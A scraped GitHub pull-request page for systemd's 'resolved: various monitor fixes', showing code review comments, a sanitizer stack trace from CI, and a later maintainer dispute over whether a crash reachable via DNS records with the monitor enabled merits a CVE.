=== Content from github.com_1b80e970_20250114_193412.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fpull%2F24853)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fpull%2F24853)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=systemd%2Fsystemd)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[systemd](/systemd)
/
**[systemd](/systemd/systemd)**
Public

* [Notifications](/login?return_to=%2Fsystemd%2Fsystemd) You must be signed in to change notification settings
* [Fork
  3.9k](/login?return_to=%2Fsystemd%2Fsystemd)
* [Star
   13.6k](/login?return_to=%2Fsystemd%2Fsystemd)

* [Code](/systemd/systemd)
* [Issues
  2.3k](/systemd/systemd/issues)
* [Pull requests
  343](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

Additional navigation options

* [Code](/systemd/systemd)
* [Issues](/systemd/systemd/issues)
* [Pull requests](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fsystemd%2Fsystemd%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fsystemd%2Fsystemd%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# resolved: various monitor fixes #24853

 Merged

[bluca](/bluca)
merged 16 commits into
[systemd:main](/systemd/systemd/tree/main "systemd/systemd:main")
from
[poettering:resolved-monitor-fixes](/poettering/systemd/tree/resolved-monitor-fixes "poettering/systemd:resolved-monitor-fixes")

Sep 30, 2022

 Merged

# [resolved: various monitor fixes](#top) #24853

[bluca](/bluca)
merged 16 commits into
[systemd:main](/systemd/systemd/tree/main "systemd/systemd:main")
from
[poettering:resolved-monitor-fixes](/poettering/systemd/tree/resolved-monitor-fixes "poettering/systemd:resolved-monitor-fixes")

Sep 30, 2022

[Conversation
53](/systemd/systemd/pull/24853)
[Commits
16](/systemd/systemd/pull/24853/commits)
[Checks
0](/systemd/systemd/pull/24853/checks)
[Files changed](/systemd/systemd/pull/24853/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![poettering](https://avatars.githubusercontent.com/u/2130732?s=60&v=4)](/poettering)

Copy link

Member

### @poettering **[poettering](/poettering)** commented [Sep 28, 2022](#issue-1389923855)

 *No description provided.*

Sorry, something went wrong.

All reactions

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
added
the
[resolve](/systemd/systemd/labels/resolve)
label
[Sep 28, 2022](#event-7481329268)

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
mentioned this pull request
[Sep 28, 2022](#ref-pullrequest-1367731232)

[Revert "Implement DNS notifications from systemd-resolved using varlink"
#24612](/systemd/systemd/pull/24612)
 Closed

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

Author

### **[poettering](/poettering)** commented [Sep 28, 2022](#issuecomment-1261450885)

| This should address all remaining issues I see with [#22845](https://github.com/systemd/systemd/pull/22845) |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
added
the
[sd-event](/systemd/systemd/labels/sd-event)
label
[Sep 28, 2022](#event-7481374253)

 [![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
[force-pushed](/systemd/systemd/compare/d1f110004995c1fa731d3fd98732ed09484dc490..507bbaec9ce1f248e5703222bb2e1eac810aae3b)
the
resolved-monitor-fixes

branch
from
[`d1f1100`](/systemd/systemd/commit/d1f110004995c1fa731d3fd98732ed09484dc490) to
[`507bbae`](/systemd/systemd/commit/507bbaec9ce1f248e5703222bb2e1eac810aae3b)  [Compare](/systemd/systemd/compare/d1f110004995c1fa731d3fd98732ed09484dc490..507bbaec9ce1f248e5703222bb2e1eac810aae3b)
[September 28, 2022 21:43](#event-7481646157)

[![bluca](https://avatars.githubusercontent.com/u/782193?s=60&v=4)](/bluca)

**[bluca](/bluca)**
approved these changes
[Sep 28, 2022](#pullrequestreview-1124406321)

 [View reviewed changes](/systemd/systemd/pull/24853/files)

Copy link

Member

### @bluca **[bluca](/bluca)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Not a big fan of removing the config flag, but ok. But this needs test updates - new helpers need unit tests, and TEST-75 needs adjustments and coverage for the monitor command.

Sorry, something went wrong.

All reactions

[src/libsystemd/sd-event/sd-event.c](/systemd/systemd/pull/24853/files#diff-d08dd7c37487147b72c897d21979b5238a928e59ce4b41852bf8ae13ee82772b)
Outdated

Show resolved

Hide resolved

[![surajkrishnan14](https://avatars.githubusercontent.com/u/72937403?s=60&v=4)](/surajkrishnan14)

**[surajkrishnan14](/surajkrishnan14)**
reviewed
[Sep 28, 2022](#pullrequestreview-1124464814)

 [View reviewed changes](/systemd/systemd/pull/24853/files)

[src/resolve/resolved-dns-rr.c](/systemd/systemd/pull/24853/files#diff-8e105d7ea39b2f837c5bb0a8368b193f80415e1966e632b81265251237c3b1e1)

Show resolved

Hide resolved

[![yuwata](https://avatars.githubusercontent.com/u/14157143?s=60&v=4)](/yuwata)

**[yuwata](/yuwata)**
reviewed
[Sep 29, 2022](#pullrequestreview-1124531424)

 [View reviewed changes](/systemd/systemd/pull/24853/files)

[man/rules/meson.build](/systemd/systemd/pull/24853/files#diff-13ce068406ca2bbbe2d1a1fcde332e50d324b35618c89a1b5651bb41c5513091)

Show resolved

Hide resolved

[src/resolve/resolved-varlink.c](/systemd/systemd/pull/24853/files#diff-1cc29f1ff5a9f6b18a3f8cde3b0122404710162b42afa9855f75c4fe89ebb7fa)
Outdated

Show resolved

Hide resolved

[![keszybz](https://avatars.githubusercontent.com/u/349618?s=60&v=4)](/keszybz)

**[keszybz](/keszybz)**
requested changes
[Sep 29, 2022](#pullrequestreview-1125260307)

 [View reviewed changes](/systemd/systemd/pull/24853/files)

Copy link

Member

### @keszybz **[keszybz](/keszybz)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Looks nice. I didn't review the monitor output in detail. [@surajkrishnan14](https://github.com/surajkrishnan14) can you review those parts to make sure that the output looks OK?

Sorry, something went wrong.

All reactions

[man/sd\_event\_add\_signal.xml](/systemd/systemd/pull/24853/files#diff-b7da4b3394ed581e8c695549d507677ac8553b1f501f792bf42884ec404d1289)
Outdated

Show resolved

Hide resolved

[man/sd\_event\_add\_signal.xml](/systemd/systemd/pull/24853/files#diff-b7da4b3394ed581e8c695549d507677ac8553b1f501f792bf42884ec404d1289)
Outdated

Show resolved

Hide resolved

[man/sd\_event\_set\_signal\_exit.xml](/systemd/systemd/pull/24853/files#diff-7d84a075077030cde4cbbf051fd902cd1da96b58ce944ae1fe00ca7a94cde32a)
Outdated

Show resolved

Hide resolved

[man/sd\_event\_set\_signal\_exit.xml](/systemd/systemd/pull/24853/files#diff-7d84a075077030cde4cbbf051fd902cd1da96b58ce944ae1fe00ca7a94cde32a)
Outdated

Show resolved

Hide resolved

[man/sd\_event\_set\_signal\_exit.xml](/systemd/systemd/pull/24853/files#diff-7d84a075077030cde4cbbf051fd902cd1da96b58ce944ae1fe00ca7a94cde32a)
Outdated

Show resolved

Hide resolved

[man/sd\_event\_set\_signal\_exit.xml](/systemd/systemd/pull/24853/files#diff-7d84a075077030cde4cbbf051fd902cd1da96b58ce944ae1fe00ca7a94cde32a)
Outdated

Show resolved

Hide resolved

[man/sd\_event\_set\_signal\_exit.xml](/systemd/systemd/pull/24853/files#diff-7d84a075077030cde4cbbf051fd902cd1da96b58ce944ae1fe00ca7a94cde32a)
Outdated

Show resolved

Hide resolved

[man/org.freedesktop.resolve1.xml](/systemd/systemd/pull/24853/files#diff-6c415b6e400b61fb87af8c87fffb412a36f79be64393a70f030d07c17c7fed0c)

Show resolved

Hide resolved

[man/resolvectl.xml](/systemd/systemd/pull/24853/files#diff-4d9f7f05e197614d894a15bbb503aee65ae7d37b9c361a0828b41c40e91f3216)
Outdated

Show resolved

Hide resolved

[man/resolvectl.xml](/systemd/systemd/pull/24853/files#diff-4d9f7f05e197614d894a15bbb503aee65ae7d37b9c361a0828b41c40e91f3216)
Outdated

Show resolved

Hide resolved

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
added
the
[reviewed/needs-rework üî®](/systemd/systemd/labels/reviewed/needs-rework%20%F0%9F%94%A8)
PR has been reviewed and needs another round of reworks
label
[Sep 29, 2022](#event-7486777769)

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=80&v=4)](/keszybz)

Copy link

Member

### **[keszybz](/keszybz)** commented [Sep 29, 2022](#issuecomment-1262279963)

| This will need another round of reviews after all the comments‚Ä¶ |
| --- |

All reactions

Sorry, something went wrong.

 [![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
[force-pushed](/systemd/systemd/compare/507bbaec9ce1f248e5703222bb2e1eac810aae3b..7590aaaaffe9227a8dd9fc904c1c0cf247fe2140)
the
resolved-monitor-fixes

branch
from
[`507bbae`](/systemd/systemd/commit/507bbaec9ce1f248e5703222bb2e1eac810aae3b) to
[`7590aaa`](/systemd/systemd/commit/7590aaaaffe9227a8dd9fc904c1c0cf247fe2140)  [Compare](/systemd/systemd/compare/507bbaec9ce1f248e5703222bb2e1eac810aae3b..7590aaaaffe9227a8dd9fc904c1c0cf247fe2140)
[September 29, 2022 14:10](#event-7487211612)

[![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=40&u=5898801f54e5dfba212029897cfe7a17f401b4b2&v=4)](/yuwata)
[yuwata](/yuwata)
added
[ci-fails/needs-rework üî•](/systemd/systemd/labels/ci-fails/needs-rework%20%F0%9F%94%A5)
Please rework this, the CI noticed an issue with the PR
and removed
[reviewed/needs-rework üî®](/systemd/systemd/labels/reviewed/needs-rework%20%F0%9F%94%A8)
PR has been reviewed and needs another round of reworks
labels
[Sep 29, 2022](#event-7488406919)

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Sep 29, 2022](#issuecomment-1262687532)

| Not a big fan of removing the config flag, but ok. But this needs test updates - new helpers need unit tests, and TEST-75 needs adjustments and coverage for the monitor command.  This is still unaddressed, and tests are failing because of it |
| --- |

All reactions

Sorry, something went wrong.

 [![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
[force-pushed](/systemd/systemd/compare/7590aaaaffe9227a8dd9fc904c1c0cf247fe2140..fd099bbe0bb53240864809a6d2ed07b5255099fd)
the
resolved-monitor-fixes

branch
from
[`7590aaa`](/systemd/systemd/commit/7590aaaaffe9227a8dd9fc904c1c0cf247fe2140) to
[`fd099bb`](/systemd/systemd/commit/fd099bbe0bb53240864809a6d2ed07b5255099fd)  [Compare](/systemd/systemd/compare/7590aaaaffe9227a8dd9fc904c1c0cf247fe2140..fd099bbe0bb53240864809a6d2ed07b5255099fd)
[September 30, 2022 08:23](#event-7493330400)

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

Author

### **[poettering](/poettering)** commented [Sep 30, 2022](#issuecomment-1263267980)

| This is still unaddressed, and tests are failing because of it  Now addressed. PTAL. |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

Author

### **[poettering](/poettering)** commented [Sep 30, 2022](#issuecomment-1263270314)

| I also added some better support for following CNAME chains: each element in the chain will show up as a separate query. But each query will also contain the questions of previous elements of the chain in a new `collectedQuestions` metadata field. This means we will report for each element of the chain the results once we have it, but we'll also tell you how we came there, and the final answer will give you complete information about the chain we followed. |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
added
[please-review](/systemd/systemd/labels/please-review)
and removed
[ci-fails/needs-rework üî•](/systemd/systemd/labels/ci-fails/needs-rework%20%F0%9F%94%A5)
Please rework this, the CI noticed an issue with the PR
labels
[Sep 30, 2022](#event-7493352920)

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
added this to the [v252](/systemd/systemd/milestone/29) milestone
[Sep 30, 2022](#event-7493353971)

[![bluca](https://avatars.githubusercontent.com/u/782193?s=60&v=4)](/bluca)

**[bluca](/bluca)**
approved these changes
[Sep 30, 2022](#pullrequestreview-1126484979)

 [View reviewed changes](/systemd/systemd/pull/24853/files)

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=40&v=4)](/bluca)
[bluca](/bluca)
added
[good-to-merge/waiting-for-ci üëç](/systemd/systemd/labels/good-to-merge/waiting-for-ci%20%F0%9F%91%8D)
PR is good to merge, but CI hasn't passed at time of review. Please merge if you see CI has passed
and removed
[please-review](/systemd/systemd/labels/please-review)
labels
[Sep 30, 2022](#event-7493528510)

[![@mrc0mmand](https://avatars.githubusercontent.com/u/679338?s=80&u=299d005fa00f8703202117668c2934027ba1a29a&v=4)](/mrc0mmand)

Copy link

Member

### **[mrc0mmand](/mrc0mmand)** commented [Sep 30, 2022](#issuecomment-1263380745)

| ``` [ 3783.010976] resolvectl[326]: ../build/src/shared/json.c:4277:116: runtime error: applying non-zero offset 140134595963136 to null pointer [ 3783.115350] resolvectl[326]:     #0 0x7f73a3af5738 in json_dispatch /systemd-meson-build/../build/src/shared/json.c:4277:116 [ 3783.115350] resolvectl[326]:     #1 0x5606782e79ed in monitor_query_dump /systemd-meson-build/../build/src/resolve/resolvectl.c:2625:13 [ 3783.115350] resolvectl[326]:     #2 0x5606782e79ed in monitor_reply /systemd-meson-build/../build/src/resolve/resolvectl.c:2677:17 [ 3783.115350] resolvectl[326]:     #3 0x7f73a3be2e00 in varlink_dispatch_reply /systemd-meson-build/../build/src/shared/varlink.c:758:29 [ 3783.115350] resolvectl[326]:     #4 0x7f73a3be2e00 in varlink_process /systemd-meson-build/../build/src/shared/varlink.c:949:13 [ 3783.115350] resolvectl[326]:     #5 0x7f73a3bf5c15 in defer_callback /systemd-meson-build/../build/src/shared/varlink.c:1888:16 [ 3783.115350] resolvectl[326]:     #6 0x7f73a3f97b62 in source_dispatch /systemd-meson-build/../build/src/libsystemd/sd-event/sd-event.c [ 3783.115350] resolvectl[326]:     #7 0x7f73a3f967e9 in sd_event_dispatch /systemd-meson-build/../build/src/libsystemd/sd-event/sd-event.c:4246:21 [ 3783.115350] resolvectl[326]:     #8 0x7f73a3f9a054 in sd_event_run /systemd-meson-build/../build/src/libsystemd/sd-event/sd-event.c:4307:21 [ 3783.115350] resolvectl[326]:     #9 0x7f73a3f9a72a in sd_event_loop /systemd-meson-build/../build/src/libsystemd/sd-event/sd-event.c:4328:21 [ 3783.115350] resolvectl[326]:     #10 0x5606782d9062 in verb_monitor /systemd-meson-build/../build/src/resolve/resolvectl.c:2720:13 [ 3783.115350] resolvectl[326]:     #11 0x7f73a3bfdb83 in dispatch_verb /systemd-meson-build/../build/src/shared/verbs.c:103:24 [ 3783.115350] resolvectl[326]:     #12 0x5606782cf033 in native_main /systemd-meson-build/../build/src/resolve/resolvectl.c:3486:16 [ 3783.115350] resolvectl[326]:     #13 0x5606782cf033 in run /systemd-meson-build/../build/src/resolve/resolvectl.c:3623:16 [ 3783.115350] resolvectl[326]:     #14 0x5606782cd4d7 in main /systemd-meson-build/../build/src/resolve/resolvectl.c:3626:1 [ 3783.115350] resolvectl[326]:     #15 0x7f73a323c28f  (/usr/lib/libc.so.6+0x2328f) (BuildId: 26c81e7e05ebaf40bac3523b7d76be0cd71fad82) [ 3783.115350] resolvectl[326]:     #16 0x7f73a323c349 in __libc_start_main (/usr/lib/libc.so.6+0x23349) (BuildId: 26c81e7e05ebaf40bac3523b7d76be0cd71fad82) [ 3783.115350] resolvectl[326]:     #17 0x5606782ca1f4 in _start /build/glibc/src/glibc/csu/../sysdeps/x86_64/start.S:115 [ 3783.115350] resolvectl[326]: SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ../build/src/shared/json.c:4277:116 in  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@mrc0mmand](https://avatars.githubusercontent.com/u/679338?s=40&u=299d005fa00f8703202117668c2934027ba1a29a&v=4)](/mrc0mmand)
[mrc0mmand](/mrc0mmand)
added
[ci-fails/needs-rework üî•](/systemd/systemd/labels/ci-fails/needs-rework%20%F0%9F%94%A5)
Please rework this, the CI noticed an issue with the PR
and removed
[good-to-merge/waiting-for-ci üëç](/systemd/systemd/labels/good-to-merge/waiting-for-ci%20%F0%9F%91%8D)
PR is good to merge, but CI hasn't passed at time of review. Please merge if you see CI has passed
labels
[Sep 30, 2022](#event-7494183887)

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

Author

### **[poettering](/poettering)** commented [Sep 30, 2022](#issuecomment-1263483106)

| grr, this is UndefinedBehaviorSanitizer being stupid here... will add work-around |
| --- |

All reactions

Sorry, something went wrong.

 [poettering](/poettering)
added 2 commits
[September 30, 2022 14:14](#commits-pushed-24fe5e9)

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&v=4)](/poettering)

`[glyph-util: add left arrow special glyph entry](/systemd/systemd/pull/24853/commits/24fe5e9807a1da8542a182fa65716e82e9a49da7 "glyph-util: add left arrow special glyph entry")`

`[24fe5e9](/systemd/systemd/pull/24853/commits/24fe5e9807a1da8542a182fa65716e82e9a49da7)`

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&v=4)](/poettering)

`[json: add dispatchers for 16bit integers](/systemd/systemd/pull/24853/commits/e085625f099ce8cf39be512b411d7032fc9af219 "json: add dispatchers for 16bit integers")`

`[e085625](/systemd/systemd/pull/24853/commits/e085625f099ce8cf39be512b411d7032fc9af219)`

17 hidden items

Load more‚Ä¶

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)
[poettering](/poettering)
added
the
[good-to-merge/waiting-for-ci üëç](/systemd/systemd/labels/good-to-merge/waiting-for-ci%20%F0%9F%91%8D)
PR is good to merge, but CI hasn't passed at time of review. Please merge if you see CI has passed
label
[Sep 30, 2022](#event-7495184594)

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=40&v=4)](/bluca)
[bluca](/bluca)
merged commit [`697f082`](/systemd/systemd/commit/697f082697c8db466fe263ea307fbf3f12f965be)
into
systemd:main

[Sep 30, 2022](https://github.com/systemd/systemd/pull/24853#event-7496166955)

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
removed
the
[good-to-merge/waiting-for-ci üëç](/systemd/systemd/labels/good-to-merge/waiting-for-ci%20%F0%9F%91%8D)
PR is good to merge, but CI hasn't passed at time of review. Please merge if you see CI has passed
label
[Oct 10, 2022](#event-7552432387)

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 19, 2022](#issuecomment-1320964567)

| I've just reported the first remote DOS with the monitor enabled: [#25449](https://github.com/systemd/systemd/issues/25449). |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1325898031)

| FWIW it's going to get its CVE in a couple of days I think. Technically there should be two CVEs because there are two different codepaths that can lead to the crash but I don't think it matters much in this particular case. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326558120)

| There is no need for any CVE, given it requires local root access to reproduce, a bug report is more than enough |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326561497)

| It requires local root access to subscribe to the notifications. Once there is at least one subscriber `resolved` can be crashed remotely without any access to the box. Those conditions are mentioned. |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326574487)

| I have also almost gotten around to [#23873](https://github.com/systemd/systemd/issues/23873) and [#23894](https://github.com/systemd/systemd/issues/23894) (those are triggered via adjacent networks though). |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326575105)

| Local root access is a necessary prerequisite, hence "can be crashed remotely" is completely nonsensical, as anything including ssh fits into that definition |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326580854)

| hence "can be crashed remotely" is completely nonsensical  By this logic resolved can never be crashed remotely because `root` should enable it in the first place and that's nonsensical. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326584905)

| No, resolved is enabled by default in many distros and images |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326592807)

| Let me get this right if resolved on one machine with at least one subscriber can be crashed by resource records coming from remote servers it's actually just a local crash that requires admin privileges? |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326604849)

| with at least one subscriber  There are zero subscribers for this debug tool by default, adding one requires real-time local root access, hence this is at best a minor bug causing a local crash, and even that's a stretch |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326620207) ‚Ä¢ edited Loading

| There are zero subscribers for this debug tool by default  Right and nobody is saying that there are more than zero subscribers by default. It affects only machines where this feature is actually used and they can be crashed by resource records coming from remote machines. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326627752)

| Which makes it a minor bug at best, but most definitely not worth of wasting anybody's time with a cve, because the security significance is non-existent given it requires real-time root access |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326648078)

| it requires real-time root access  Well, by this logic [#23873](https://github.com/systemd/systemd/issues/23873) (where `mdns` should be turned on at some point somehow by privileged users by editing the config file or at runtime) it can't be triggered via adjacent networks either and I don't agree with that.  Anyway I get what you are saying. It seems that by that logic only stuff like [#19584](https://github.com/systemd/systemd/issues/19584) can be considered a remote DOS. |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326687850)

| I sent a link to this thread. It should be added to the description eventually. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326703437)

| Sent to whom? What description? |
| --- |

All reactions

Sorry, something went wrong.

